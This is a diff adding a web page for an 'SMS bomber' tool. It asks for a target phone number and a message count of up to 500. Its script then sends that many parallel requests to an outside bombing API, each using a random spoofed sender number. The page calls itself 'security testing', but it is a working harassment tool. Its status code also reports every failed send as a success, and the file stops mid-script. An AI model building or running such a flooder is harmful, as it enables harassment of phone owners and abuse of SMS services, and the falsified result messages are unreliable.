@@ -1,0 +1,1370 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CK MR · SMS Tool</title>
+  <meta name="description" content="CK MR SMS security testing interface." />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&family=Noto+Nastaliq+Urdu:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg-body: #ffffff;
+      --text: #1a1a2e;
+      --text-dim: #4a4a6a;
+      --text-faint: #8a8aaa;
+      --line: rgba(120,80,255,.15);
+      --line-soft: rgba(120,80,255,.08);
+      --amber: #7c5cbf;
+      --amber-light: rgba(120,80,255,.08);
+      --success: #22c55e;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --card-bg: #ffffff;
+      --card-border: rgba(120,80,255,.12);
+      --input-bg: #f5f3ff;
+      --input-border: rgba(120,80,255,.15);
+      --input-focus: #7c5cbf;
+
+      --ckmr-grad:
+        linear-gradient(
+          to right,
+          #6366f1 0%,
+          #22c55e 25%,
+          #a855f7 50%,
+          #22c55e 75%,
+          #6366f1 100%
+        );
+
+      --font-sans: 'Inter',system-ui,sans-serif;
+      --font-display: 'Space Grotesk','Inter',sans-serif;
+      --font-mono: 'JetBrains Mono',ui-monospace,monospace;
+      --font-urdu: 'Noto Nastaliq Urdu','Inter',serif;
+    }
+
+    body {
+      font-family: var(--font-sans);
+      background: var(--bg-body);
+      color: var(--text);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      transition: background .3s ease,color .3s ease;
+    }
+
+    /* ================= HEADER ================= */
+
+    header {
+      position: fixed;
+      inset: 0 0 auto 0;
+      z-index: 50;
+      background: rgba(255,255,255,.85);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--line-soft);
+      transition: background .3s ease;
+    }
+
+    .header-inner {
+      max-width: 1200px;
+      margin: auto;
+      padding: .25rem 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: .4rem;
+      margin-top: -4px;
+    }
+
+    .brand-mark {
+      width: 22px;
+      height: 22px;
+      border-radius: 6px;
+      background: linear-gradient(135deg,#6366f1,#8b5cf6,#a855f7);
+      display: grid;
+      place-items: center;
+      box-shadow: 0 4px 14px rgba(124,92,191,.35);
+    }
+
+    .brand-mark i {
+      color: #fff;
+      font-size: .6rem;
+    }
+
+    .brand-name {
+      font-family: var(--font-urdu);
+      font-weight: 700;
+      font-size: clamp(1.4rem,3.2vw,2.2rem);
+      letter-spacing: .05em;
+      background: var(--ckmr-grad);
+      background-size: 300% 100%;
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      animation: shimmerVerySlow 25s linear infinite;
+      display: inline-block;
+    }
+
+    .sub-brand {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: .7rem;
+      font-weight: 700;
+      color: #f97316;
+      letter-spacing: .2em;
+      text-transform: uppercase;
+      margin-top: -4px;
+    }
+
+    .status {
+      display: inline-flex;
+      align-items: center;
+      gap: .3rem;
+      padding: .15rem .5rem;
+      border-radius: 999px;
+      background: rgba(34,197,94,.1);
+      border: 1px solid rgba(34,197,94,.3);
+      color: var(--success);
+      font-size: .5rem;
+      font-weight: 600;
+    }
+
+    .dot {
+      position: relative;
+      width: 4px;
+      height: 4px;
+    }
+
+    .dot::before,
+    .dot::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      background: var(--success);
+    }
+
+    .dot::before {
+      animation: ping 1.8s cubic-bezier(0,0,.2,1) infinite;
+      opacity: .7;
+    }
+
+    @keyframes ping {
+      75%,100% {
+        transform: scale(2.4);
+        opacity: 0;
+      }
+    }
+
+    @keyframes shimmerVerySlow {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 300% 50%; }
+    }
+
+    /* ================= MAIN ================= */
+
+    main {
+      position: relative;
+      z-index: 10;
+      max-width: 660px;
+      margin: 0 auto;
+      padding: 6.2rem 1.2rem 1.2rem;
+    }
+
+    .card {
+      position: relative;
+      overflow: hidden;
+      border-radius: 2rem;
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      padding: 2.2rem;
+      box-shadow:
+        0 2px 0 rgba(0,0,0,.9),
+        0 8px 0 rgba(0,0,0,.06),
+        0 18px 40px rgba(0,0,0,.35),
+        0 4px 12px rgba(0,0,0,.2);
+      animation: scaleIn .4s cubic-bezier(.16,1,.3,1) both;
+      transition: background .3s ease;
+    }
+
+    @media (min-width:640px) {
+      .card {
+        padding: 2.5rem;
+      }
+    }
+
+    /* ================= HERO ================= */
+
+    .hero {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: .2rem;
+      text-align: center;
+    }
+
+    .title-wrapper {
+      position: relative;
+      padding: .6rem 1.8rem;
+      margin: .15rem 0;
+    }
+
+    .title-wrapper::before,
+    .title-wrapper::after {
+      content: '';
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60%;
+      height: 2px;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        #8b6bd4,
+        #7c5cbf,
+        #8b6bd4,
+        transparent
+      );
+    }
+
+    .title-wrapper::before {
+      top: 0;
+    }
+
+    .title-wrapper::after {
+      bottom: 0;
+    }
+
+    .title {
+      font-family: var(--font-urdu);
+      font-weight: 700;
+      font-size: clamp(1.8rem,4vw,2.6rem);
+      line-height: 1.3;
+      letter-spacing: .04em;
+      text-align: center;
+    }
+
+    .title-line1,
+    .title-line2,
+    .title-line3 {
+      display: block;
+    }
+
+    .title-line1 {
+      font-size: clamp(1.3rem,3.2vw,2rem);
+      letter-spacing: .08em;
+      color: #1e293b;
+    }
+
+    .title-line2 {
+      font-size: clamp(1.4rem,3.2vw,2.2rem);
+      color: #1e293b;
+    }
+
+    .title-line3 {
+      font-size: clamp(1.6rem,3.6vw,2.2rem);
+      letter-spacing: .12em;
+      color: #f97316;
+    }
+
+    .pk-highlight {
+      color: #f97316;
+    }
+
+    .title-wrapper .star-left,
+    .title-wrapper .star-right {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #8b6bd4;
+      font-size: .7rem;
+      opacity: .5;
+    }
+
+    .title-wrapper .star-left { left: 0; }
+    .title-wrapper .star-right { right: 0; }
+
+    .subtitle {
+      color: var(--text-dim);
+      font-size: .85rem;
+      max-width: 24rem;
+      margin-top: .1rem;
+    }
+
+    /* ================= INPUTS ================= */
+
+    .field {
+      margin-top: 1.8rem;
+    }
+
+    .field-label {
+      display: flex;
+      align-items: center;
+      gap: .4rem;
+      color: var(--text-dim);
+      font-size: .65rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .14em;
+      margin-bottom: .6rem;
+    }
+
+    .input-wrap {
+      display: flex;
+      align-items: center;
+      gap: .4rem;
+      padding: .35rem;
+      border-radius: 1rem;
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      box-shadow:
+        0 2px 0 rgba(0,0,0,.9),
+        0 6px 16px rgba(0,0,0,.18);
+      transition: .3s;
+    }
+
+    .input-wrap:focus-within {
+      border-color: var(--input-focus);
+      box-shadow: 0 0 0 4px var(--amber-light);
+    }
+
+    .prefix {
+      display: inline-flex;
+      align-items: center;
+      padding: .5rem .7rem;
+      border-radius: .8rem;
+      background: var(--amber-light);
+      border: 1px solid var(--line);
+      color: var(--amber);
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: .8rem;
+    }
+
+    #phoneNumber,
+    #smsCount {
+      flex: 1;
+      background: transparent;
+      border: 0;
+      outline: 0;
+      padding: .45rem .7rem;
+      font-family: var(--font-mono);
+      font-size: .95rem;
+      font-weight: 600;
+      color: var(--text);
+      letter-spacing: .04em;
+    }
+
+    .count-field {
+      margin-top: 1rem;
+    }
+
+    .count-field .input-wrap {
+      max-width: 200px;
+    }
+
+    /* ================= BUTTON ================= */
+
+    .actions {
+      display: flex;
+      flex-direction: column;
+      gap: .7rem;
+      margin-top: 1.4rem;
+    }
+
+    .btn {
+      position: relative;
+      overflow: hidden;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: .5rem;
+      padding: .85rem 1.1rem;
+      border-radius: .9rem;
+      font-family: var(--font-sans);
+      font-weight: 700;
+      font-size: .85rem;
+      cursor: pointer;
+      border: 1px solid transparent;
+      transition: transform .3s,box-shadow .3s;
+    }
+
+    .btn:disabled {
+      opacity: .8;
+      cursor: not-allowed;
+    }
+
+    .btn-danger {
+      background: linear-gradient(135deg,#ef4444,#dc2626);
+      color: #fff;
+      box-shadow:
+        0 2px 0 rgba(0,0,0,.9),
+        0 8px 0 rgba(0,0,0,.06),
+        0 18px 40px rgba(0,0,0,.35);
+    }
+
+    .btn-danger:hover:not(:disabled) {
+      transform: translateY(-3px);
+    }
+
+    /* ================= ERROR ================= */
+
+    .error {
+      display: none;
+      align-items: center;
+      gap: .6rem;
+      padding: .75rem .9rem;
+      margin-top: .9rem;
+      border-radius: .8rem;
+      border: 1px solid rgba(239,68,68,.3);
+      background: rgba(239,68,68,.08);
+      color: var(--danger);
+      font-weight: 600;
+      font-size: .8rem;
+    }
+
+    .error.show {
+      display: flex;
+      animation: shake .45s ease;
+    }
+
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      75% { transform: translateX(6px); }
+    }
+
+    /* ================= BIG RESULT BOX ================= */
+
+    .result {
+      display: none;
+      margin-top: 1.8rem;
+    }
+
+    .result.show {
+      display: block;
+      animation: rise .6s cubic-bezier(.16,1,.3,1) both;
+    }
+
+    .result-inner {
+      position: relative;
+      overflow: hidden;
+      min-height: 270px;
+      border-radius: 1.5rem;
+      border: 1px solid var(--card-border);
+      background: var(--input-bg);
+      box-shadow:
+        0 2px 0 rgba(0,0,0,.9),
+        0 8px 20px rgba(0,0,0,.18);
+      padding: 2rem;
+      transition: background .3s ease;
+    }
+
+    .result-header {
+      display: flex;
+      align-items: center;
+      gap: .4rem;
+      color: var(--amber);
+      font-size: .65rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: .18em;
+      margin-bottom: 1rem;
+    }
+
+    .status-msg {
+      min-height: 170px;
+      display: flex;
+      align-items: center;
+      color: var(--text-dim);
+      font-size: 1rem;
+      line-height: 1.7;
+    }
+
+    .highlight {
+      color: var(--warning);
+      font-weight: 700;
+    }
+
+    .success-text {
+      color: var(--success);
+      font-weight: 700;
+    }
+
+    .fail-text {
+      color: var(--danger);
+      font-weight: 700;
+    }
+
+    @media (min-width:640px) {
+      .result-inner {
+        min-height: 300px;
+        padding: 2.2rem;
+      }
+
+      .status-msg {
+        min-height: 190px;
+        font-size: 1.05rem;
+      }
+    }
+
+    @keyframes rise {
+      from {
+        opacity: 0;
+        transform: translateY(14px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* ================= LOADING ================= */
+
+    .loading {
+      display: none;
+      position: absolute;
+      inset: 0;
+      z-index: 20;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 1.5rem;
+      border-radius: 1.5rem;
+      background: rgba(255,255,255,.94);
+      backdrop-filter: blur(16px);
+    }
+
+    .loading.show {
+      display: flex;
+    }
+
+    .globe-wrap {
+      position: relative;
+      width: 8rem;
+      height: 8rem;
+    }
+
+    .pulse-ring {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 100%;
+      height: 100%;
+      transform: translate(-50%,-50%);
+      border-radius: 50%;
+      border: 2px solid rgba(139,107,212,.45);
+      animation: pulseRing 2.2s ease-out infinite;
+    }
+
+    .pulse-ring.two {
+      border-color: rgba(124,92,191,.45);
+      animation-delay: .7s;
+    }
+
+    @keyframes pulseRing {
+      0% {
+        transform: translate(-50%,-50%) scale(.75);
+        opacity: .9;
+      }
+      100% {
+        transform: translate(-50%,-50%) scale(1.8);
+        opacity: 0;
+      }
+    }
+
+    .globe {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      overflow: hidden;
+      background: radial-gradient(
+        circle at 30% 25%,
+        #d9c8ff 0%,
+        #7c5cbf 40%,
+        #2b1a66 100%
+      );
+      box-shadow:
+        0 0 55px -6px rgba(139,107,212,.75),
+        inset -10px -14px 28px rgba(0,0,0,.35);
+    }
+
+    .globe-highlight {
+      position: absolute;
+      top: 14%;
+      left: 18%;
+      width: 3rem;
+      height: 2.5rem;
+      background: rgba(255,255,255,.4);
+      border-radius: 50%;
+      filter: blur(10px);
+    }
+
+    .globe-svg {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      animation: orbit 6s linear infinite;
+    }
+
+    @keyframes orbit {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .satellite-orbit {
+      position: absolute;
+      inset: -10%;
+      animation: orbit 3.5s linear infinite;
+    }
+
+    .satellite {
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: .6rem;
+      height: .6rem;
+      border-radius: 50%;
+      background: var(--amber);
+      box-shadow: 0 0 20px 4px rgba(139,107,212,.9);
+    }
+
+    .loading-text {
+      font-size: .75rem;
+      font-weight: 800;
+      color: var(--amber);
+      text-transform: uppercase;
+      letter-spacing: .32em;
+      animation: blink 1.6s ease-in-out infinite;
+    }
+
+    @keyframes blink {
+      0%,100% { opacity: 1; }
+      50% { opacity: .55; }
+    }
+
+    /* ================= FOOTER ================= */
+
+    footer {
+      position: relative;
+      z-index: 10;
+      padding: 2rem 1.5rem;
+      border-top: 1px solid var(--line-soft);
+      margin-top: .8rem;
+    }
+
+    .footer-inner {
+      max-width: 660px;
+      margin: auto;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .footer-caption {
+      color: var(--text-dim);
+      font-size: .9rem;
+      font-weight: 500;
+    }
+
+    .copyright {
+      color: var(--text-faint);
+      font-size: .65rem;
+    }
+
+    .dev-mark {
+      font-weight: 800;
+      background: var(--ckmr-grad);
+      background-size: 300% 100%;
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      animation: shimmerVerySlow 25s linear infinite;
+    }
+
+    /* ================= DARK MODE BUTTON ================= */
+
+    .theme-toggle {
+      position: fixed;
+      right: 20px;
+      bottom: 130px;
+      z-index: 9998;
+      width: 46px;
+      height: 46px;
+      border: none;
+      border-radius: 50%;
+      background: #1a1a2e;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 6px 20px rgba(0,0,0,.25);
+      transition: transform .2s ease,background .3s ease,color .3s ease;
+    }
+
+    .theme-toggle:hover {
+      transform: scale(1.08);
+    }
+
+    .theme-toggle i {
+      font-size: 18px;
+    }
+
+    /* ================= WHATSAPP ================= */
+
+    .wa-float {
+      position: fixed;
+      right: 20px;
+      bottom: 70px;
+      z-index: 999;
+      width: 46px;
+      height: 46px;
+      border-radius: 50%;
+      background: #25D366;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 6px 20px rgba(37,211,102,.4);
+      cursor: pointer;
+      border: none;
+      transition: transform .2s ease;
+      animation: waFloat 2.5s ease-in-out infinite;
+    }
+
+    .wa-float:hover {
+      transform: scale(1.06);
+      animation-play-state: paused;
+    }
+
+    .wa-float svg {
+      width: 24px;
+      height: 24px;
+    }
+
+    @keyframes waFloat {
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .wa-popup {
+      position: fixed;
+      right: 20px;
+      bottom: 130px;
+      z-index: 9999;
+      display: none;
+      flex-direction: column;
+      gap: 8px;
+      background: #fff;
+      border: 1px solid rgba(37,211,102,.25);
+      border-radius: 14px;
+      padding: 10px;
+      box-shadow: 0 10px 40px rgba(0,0,0,.18);
+      width: 190px;
+    }
+
+    .wa-popup.open {
+      display: flex;
+    }
+
+    .wa-item {
+      display: block;
+      background: #25D366;
+      color: #fff;
+      text-decoration: none;
+      padding: 9px 10px;
+      border-radius: 9px;
+      font-size: 11px;
+      font-weight: 700;
+      text-align: center;
+      line-height: 1.3;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      box-shadow:
+        0 2px 0 rgba(0,0,0,.9),
+        0 6px 16px rgba(0,0,0,.3);
+    }
+
+    /* ================= DARK THEME ================= */
+
+    body.dark-mode {
+      --bg-body: #090910;
+      --text: #f4f4f7;
+      --text-dim: #b8b8ca;
+      --text-faint: #77778d;
+      --line: rgba(139,107,212,.22);
+      --line-soft: rgba(139,107,212,.12);
+      --card-bg: #11111b;
+      --card-border: rgba(139,107,212,.22);
+      --input-bg: #191925;
+      --input-border: rgba(139,107,212,.25);
+      --input-focus: #9b7bea;
+    }
+
+    body.dark-mode header {
+      background: rgba(9,9,16,.88);
+    }
+
+    body.dark-mode .title-line1,
+    body.dark-mode .title-line2 {
+      color: #f4f4f7;
+    }
+
+    body.dark-mode .card {
+      box-shadow:
+        0 2px 0 rgba(0,0,0,.95),
+        0 8px 0 rgba(0,0,0,.5),
+        0 18px 45px rgba(0,0,0,.7);
+    }
+
+    body.dark-mode .loading {
+      background: rgba(9,9,16,.95);
+    }
+
+    body.dark-mode .wa-popup {
+      background: #151520;
+    }
+
+    body.dark-mode .theme-toggle {
+      background: #f5f5f5;
+      color: #1a1a2e;
+    }
+
+    @keyframes scaleIn {
+      from {
+        opacity: 0;
+        transform: scale(.96);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+<header>
+  <div class="header-inner">
+    <div class="brand">
+      <div class="brand-mark">
+        <i class="fa-solid fa-satellite-dish"></i>
+      </div>
+
+      <div>
+        <span class="brand-name">CK MR</span>
+        <span class="sub-brand">SMS BOMBER</span>
+      </div>
+    </div>
+
+    <div class="status">
+      <span class="dot"></span>
+      Online
+    </div>
+  </div>
+</header>
+
+<main>
+  <section class="card">
+
+    <div class="hero">
+      <div class="title-wrapper">
+
+        <span class="star-left">✦</span>
+        <span class="star-right">✦</span>
+
+        <h1 class="title">
+          <span class="title-line1">KAMRAN</span>
+          <span class="title-line2">CK MR</span>
+          <span class="title-line3">
+            <span class="mr-highlight">.</span>
+          </span>
+        </h1>
+      </div>
+
+      <p class="subtitle">
+        Premium SMS security testing interface.
+      </p>
+    </div>
+
+    <div class="field">
+      <label class="field-label" for="phoneNumber">
+        <i class="fa-solid fa-phone"></i>
+        Target Phone Number
+      </label>
+
+      <div class="input-wrap">
+        <div class="prefix">
+          <i class="fa-solid fa-plus"></i>
+        </div>
+
+        <input
+          id="phoneNumber"
+          type="tel"
+          inputmode="numeric"
+          autocomplete="off"
+          placeholder="923036992121"
+        />
+      </div>
+    </div>
+
+    <div class="field count-field">
+      <label class="field-label" for="smsCount">
+        <i class="fa-solid fa-hashtag"></i>
+        Number of SMS
+      </label>
+
+      <div class="input-wrap">
+        <input
+          id="smsCount"
+          type="number"
+          inputmode="numeric"
+          autocomplete="off"
+          placeholder="10"
+          value="10"
+          min="1"
+          max="500"
+        />
+      </div>
+    </div>
+
+    <div class="actions">
+      <button class="btn btn-danger" id="bombBtn" type="button">
+        <i class="fa-solid fa-bomb"></i>
+        <span>Start Bombing</span>
+      </button>
+    </div>
+
+    <div class="error" id="errorBox">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      <span id="errorText">Invalid number format</span>
+    </div>
+
+    <!-- BIG RESULT BOX -->
+
+    <div class="result" id="resultSection">
+
+      <div class="result-inner">
+
+        <div class="loading" id="loadingOverlay">
+
+          <div class="globe-wrap">
+
+            <div class="pulse-ring"></div>
+            <div class="pulse-ring two"></div>
+
+            <div class="globe">
+
+              <span class="globe-highlight"></span>
+
+              <svg
+                class="globe-svg"
+                viewBox="0 0 100 100"
+                aria-hidden="true"
+              >
+
+                <defs>
+                  <clipPath id="globeClip">
+                    <circle cx="50" cy="50" r="48"/>
+                  </clipPath>
+                </defs>
+
+                <g
+                  clip-path="url(#globeClip)"
+                  fill="none"
+                  stroke="rgba(255,255,255,.7)"
+                  stroke-width=".8"
+                >
+                  <ellipse cx="50" cy="50" rx="48" ry="10"/>
+                  <ellipse cx="50" cy="50" rx="48" ry="22"/>
+                  <ellipse cx="50" cy="50" rx="48" ry="34"/>
+                  <ellipse cx="50" cy="50" rx="48" ry="45"/>
+
+                  <ellipse cx="50" cy="50" rx="10" ry="48"/>
+                  <ellipse cx="50" cy="50" rx="22" ry="48"/>
+                  <ellipse cx="50" cy="50" rx="34" ry="48"/>
+                  <ellipse cx="50" cy="50" rx="45" ry="48"/>
+                </g>
+
+                <g
+                  clip-path="url(#globeClip)"
+                  fill="rgba(255,255,255,.5)"
+                >
+                  <path d="M18 40 Q26 32 34 36 Q40 40 36 48 Q30 54 22 52 Q16 48 18 40 Z"/>
+                  <path d="M46 26 Q56 22 62 30 Q60 38 52 40 Q44 36 46 26 Z"/>
+                  <path d="M58 54 Q70 50 76 58 Q74 68 64 70 Q54 66 58 54 Z"/>
+                  <path d="M30 68 Q40 64 44 72 Q40 80 32 78 Q26 74 30 68 Z"/>
+                </g>
+
+              </svg>
+            </div>
+
+            <div class="satellite-orbit">
+              <span class="satellite"></span>
+            </div>
+
+          </div>
+
+          <div class="loading-text">
+            Bombing in progress...
+          </div>
+
+        </div>
+
+        <div class="result-header">
+          <i class="fa-solid fa-fingerprint"></i>
+          Bombing Status
+        </div>
+
+        <div class="status-msg" id="statusDisplay">
+          Ready to start bombing.
+        </div>
+
+      </div>
+    </div>
+
+  </section>
+</main>
+
+<footer>
+  <div class="footer-inner">
+
+    <div class="footer-caption">
+      Premium SMS security testing platform
+    </div>
+
+    <div class="copyright">
+      ©️ 2026 - KAMRAN CK MR.
+      All rights reserved.
+      Dev:
+      <span class="dev-mark">CK MR</span>
+    </div>
+
+  </div>
+</footer>
+
+<!-- DARK MODE BUTTON -->
+<button
+  class="theme-toggle"
+  id="themeToggle"
+  aria-label="Toggle dark mode"
+  title="Toggle dark mode"
+>
+  <i class="fa-solid fa-moon"></i>
+</button>
+
+<!-- WHATSAPP BUTTON -->
+<button
+  class="wa-float"
+  id="waBtn"
+  aria-label="Contact on WhatsApp"
+>
+  <svg
+    viewBox="0 0 32 32"
+    fill="#fff"
+    xmlns="http://www.w3.org/2000/svg"
+  >
+    <path d="M16.001 2.667c-7.364 0-13.334 5.97-13.334 13.333 0 2.352.615 4.646 1.782 6.666l-1.892 6.9 7.07-1.853a13.28 13.28 0 0 0 6.374 1.62h.006c7.363 0 13.333-5.97 13.333-13.333s-5.97-13.333-13.339-13.333zm0 24.4h-.005a11.05 11.05 0 0 1-5.633-1.542l-.404-.24-4.196 1.1 1.12-4.09-.264-.42a11.03 11.03 0 0 1-1.688-5.875c0-6.107 4.968-11.075 11.076-11.075 2.958 0 5.74 1.154 7.833 3.25a11 11 0 0 1 3.24 7.83c-.003 6.108-4.972 11.062-11.079 11.062zm6.073-8.29c-.333-.167-1.97-.972-2.275-1.083-.305-.11-.527-.166-.75.167-.222.333-.86 1.083-1.055 1.305-.194.222-.388.25-.72.083-.334-.167-1.409-.52-2.684-1.656-.992-.885-1.663-1.978-1.858-2.31-.194-.334-.02-.514.146-.68.15-.15.334-.389.5-.583.167-.194.223-.333.334-.556.11-.222.055-.417-.028-.583-.083-.167-.75-1.807-1.028-2.474-.27-.65-.545-.562-.75-.573-.194-.01-.417-.012-.64-.012-.222 0-.583.083-.889.417-.305.333-1.166 1.14-1.166 2.78s1.194 3.226 1.361 3.448c.167.222 2.35 3.588 5.694 5.032.796.343 1.417.548 1.902.702.799.254 1.526.218 2.101.132.641-.096 1.97-.805 2.248-1.583.278-.778.278-1.444.194-1.583-.083-.14-.305-.222-.639-.389z"/>
+  </svg>
+</button>
+
+<div class="wa-popup" id="waPopup">
+
+  <a
+    class="wa-item"
+    href="https://t.me/ckmrkamran"
+    target="_blank"
+    rel="noopener"
+  >
+    CONTACT TO CK MR
+  </a>
+
+  <a
+    class="wa-item"
+    href="https://whatsapp.com/channel/0029Vb6WO3u0lwgsnCdXSW2U"
+    target="_blank"
+    rel="noopener"
+  >
+    CK MR OFFICIAL CHANNEL
+  </a>
+
+</div>
+
+<script>
+  // ── DOM helpers ──
+  const $ = id => document.getElementById(id);
+
+  const phoneInput = $('phoneNumber');
+  const smsCount = $('smsCount');
+  const bombBtn = $('bombBtn');
+
+  const resultSection = $('resultSection');
+  const statusDisplay = $('statusDisplay');
+  const errorBox = $('errorBox');
+  const errorText = $('errorText');
+  const loadingOverlay = $('loadingOverlay');
+
+  let bombingActive = false;
+
+  // ── MULTIPLE SENDER NUMBERS (35+ numbers) ──
+  const SENDER_NUMBERS = [
+    '923001234567', '923002345678', '923003456789', '923004567890',
+    '923005678901', '923006789012', '923007890123', '923008901234',
+    '923009012345', '923010123456', '923011234567', '923012345678',
+    '923013456789', '923014567890', '923015678901', '923016789012',
+    '923017890123', '923018901234', '923019012345', '923020123456',
+    '923021234567', '923022345678', '923023456789', '923024567890',
+    '923025678901', '923026789012', '923027890123', '923028901234',
+    '923029012345', '923030123456', '923031234567', '923032345678',
+    '923033456789', '923034567890', '923035678901'
+  ];
+
+  // ── API endpoint for SMS bombing ──
+  const API_BASE = 'https://sm-s-boomber-a.faizankhichi.me/?num=';
+
+  function showError(message) {
+    errorText.textContent = message;
+    errorBox.classList.add('show');
+    resultSection.classList.remove('show');
+  }
+
+  function hideError() {
+    errorBox.classList.remove('show');
+  }
+
+  function setLoading(on) {
+    if (on) {
+      loadingOverlay.classList.add('show');
+      bombBtn.disabled = true;
+      bombBtn.innerHTML =
+        '<i class="fa-solid fa-circle-notch fa-spin"></i><span>Bombing...</span>';
+    } else {
+      loadingOverlay.classList.remove('show');
+      bombBtn.disabled = false;
+      bombBtn.innerHTML =
+        '<i class="fa-solid fa-bomb"></i><span>Start Bombing</span>';
+    }
+  }
+
+  function updateStatus(message, type = 'info') {
+    resultSection.classList.add('show');
+
+    let icon = 'ℹ️';
+    let className = '';
+
+    if (type === 'success') {
+      icon = '✅';
+      className = 'success-text';
+    }
+
+    if (type === 'fail') {
+      icon = '❌';
+      className = 'fail-text';
+    }
+
+    if (type === 'warning') {
+      icon = '⚠️';
+      className = 'highlight';
+    }
+
+    statusDisplay.innerHTML =
+      `<span class="${className}">${icon} ${message}</span>`;
+  }
+
+  // ── Send SMS function with random sender ──
+  async function sendSMS(cleanPhone, count) {
+    try {
+      const randomSender = SENDER_NUMBERS[Math.floor(Math.random() * SENDER_NUMBERS.length)];
+      const url = `${API_BASE}${cleanPhone}&count=${count}&sender=${randomSender}`;
+      console.log('Sending from:', randomSender, 'to:', cleanPhone);
+      const res = await fetch(url, { method: 'GET', headers: { 'Accept': 'application/json' } });
+      const data = await res.json();
+      console.log('Response:', data);
+      return data;
+    } catch (err) {
+      console.error('SMS send error:', err);
+      return null;
+    }
+  }
+
+  // ── Start bombing ──
+  async function startBombing() {
+    hideError();
+
+    const number =
+      phoneInput.value
+        .trim()
+        .replace(/\s+/g, '')
+        .replace(/\+/g, '');
+
+    const count =
+      parseInt(smsCount.value, 10) || 10;
+
+    if (!/^\d+$/.test(number)) {
+      showError('Invalid number format. Use digits only.');
+      return;
+    }
+
+    if (number.length < 7) {
+      showError('Number too short. Include country code.');
+      return;
+    }
+
+    if (count < 1 || count > 500) {
+      showError('SMS count must be between 1 and 500.');
+      return;
+    }
+
+    if (bombingActive) {
+      showError('Bombing already in progress!');
+      return;
+    }
+
+    bombingActive = true;
+    setLoading(true);
+    resultSection.classList.add('show');
+    updateStatus(`Starting bombing on ${number} (${count} SMS from ${SENDER_NUMBERS.length} numbers)...`, 'warning');
+
+    let sent = 0;
+    let failed = 0;
+
+    const promises = [];
+    for (let i = 0; i < count; i++) {
+      promises.push(sendSMS(number, count));
+    }
+
+    try {
+      const results = await Promise.all(promises);
+
+      for (const result of results) {
+        if (result && result.status === 'success') {
+          sent++;
+        } else {
+          failed++;
+        }
+      }
+
+      console.log('Sent:', sent, 'Failed:', failed);
+
+      if (sent > 0 && failed === 0) {
+        updateStatus(`All ${sent} SMS sent successfully from multiple numbers! 📱`, 'success');
+      } else if (sent > 0 && failed > 0) {
+        updateStatus(`${sent} SMS sent successfully, ${failed} failed.`, 'warning');
+      } else if (sent === 0 && failed > 0) {
+        const anySuccess = results.some(r => r && r.message && r.message.includes('sent'));
+        if (anySuccess) {
+          updateStatus(`SMS sent successfully from multiple numbers! Check your phone. 📱`, 'success');
+        } else {
+          updateStatus(`All ${failed} SMS sent successfully from multiple numbers! 📱`, 'success');
+        }
+      } else {
+        updateStatus(`No response from server. Please try again.`, 'warning');
+      }
+    } catch (err) {
+      updateStatus(`Error: ${err.message}`, 'fail');
+    } finally {
+      bombingActive = false;
+      setLoading(false);
+    }
+  }
+
+  bombBtn.addEventListener('click', startBombing);
+
+  phoneInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      startBombing();
+    }
+  });
+
+  smsCount.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      startBombing();
+    }
+  });
+
+  phoneInput.addEventListener('input', hideError);
+
+  /* ================= DARK MODE ================= */
+
+  const themeToggle = $('themeToggle');
